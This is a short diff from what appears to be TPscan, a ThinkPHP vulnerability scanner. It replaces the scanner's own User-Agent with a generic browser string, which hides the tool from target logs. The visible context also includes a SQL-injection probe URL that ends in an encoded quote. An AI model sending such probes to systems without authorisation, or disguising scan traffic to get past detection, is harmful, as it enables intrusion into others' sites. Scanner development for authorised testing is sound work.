@@ -16,7 +16,7 @@ def thinkphp_multi_sql_leak_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent" : 'TPscan',
+        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
     }
     payloads = [
         r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
